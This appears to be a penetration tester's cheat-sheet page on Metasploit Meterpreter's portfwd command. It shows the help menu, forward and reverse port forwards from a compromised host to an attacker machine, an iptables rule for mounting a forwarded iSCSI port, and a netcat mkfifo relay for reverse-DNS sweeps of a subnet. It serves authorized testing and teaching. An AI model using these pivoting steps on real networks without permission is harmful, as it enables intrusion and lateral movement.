# Metasploit

## 01 - Help Menu

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

## 02 - Usage

Bind port from the target.

```
meterpreter > portfwd add -l <local_port> -p <bind_port> -r <target_IP>
```

Reverse port forwarding from the compromised target.

```
meterpreter > portfwd add -R -L <attacker_IP> -l <local_port> -p <bind_port> -r <compromised_target_IP>
```

Remove port forward rule.

```
meterpreter > portfwd delete -l <local_port> -p <bind_port> -r <target_IP>
```

Remove all port forwarding rules

```
meterpreter > portfwd flush
```

## 03 - Scenarios

### 3.1 - Bind port and exploit

```
meterpreter > portfwd add -l <local_port> -p <bind_port> -r <target_IP>
```

### 3.2 - Bind ISCSI port from and mount it

```
meterpreter > portfwd add -l <local_port> -p 3260 -r <target_IP>

# iptables -t nat -A OUTPUT -p tcp --dport 3260 -d <target_IP> -j DNAT --to-destination 127.0.0.1:<local_port>
```

### 3.3 - Reverse Bind Port Forwarding

Refer to [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x06 - Pivoting and Lateral Movement/Lateral Movement/Windows/P2P Callback Shells|P2P Callback Shells]]

### 3.4 - DNS Port Forwarding To Perform Quick Recon

TODO: Refer to the links (under Scenarios section) with [[DNSChef]] or use just netcat to listen port 53 instead

```
meterpreter > portfwd add -l <local_port> -L 127.0.0.1 -p 53 -r <DNS_server_IP>

meterpreter > portfwd list

userware@hackware-os:~# mkfifo /tmp/fifo

userware@hackware-os:~# nc -lup 53 < /tmp/fifo | nc localhost 6667 > /tmp/fifo

userware@hackware-os:~# cat /etc/resolv.conf
..[omitted]..
nameserver 127.0.0.1

$ cat /etc/dnsmasq.conf
..[omitted]..
```

Scan the network via DNS lookup.

```
$ for ip in 192.168.1.{1..254}; do $(host $ip 127.0.0.1); done

$ nmap -sL --dns-servers 127.0.0.1 192.168.1.0/24
```

---
## References

- [Metasploit Unleashed: Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)

- [Basic Pivoting Techniques: SSH Dynamic Port Forwarding + Metasploit over SSH](https://www.youtube.com/watch?v=6gqwxGE4o8E)

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)

- [Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

- [How to Implement Pivoting and Relaying Techniques Using Meterpreter](https://medium.com/axon-technologies/how-to-implement-pivoting-and-relaying-techniques-using-meterpreter-b6f5ec666795)

- [Hacking Tutorials: Port forwarding - Accessing local ports remotely](https://www.hackingtutorials.org/metasploit-tutorials/metasploitable-3-port-forwarding/)

### Scenarios

- [Security Art Work: DNS Port Forwarding con Meterpreter](https://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/)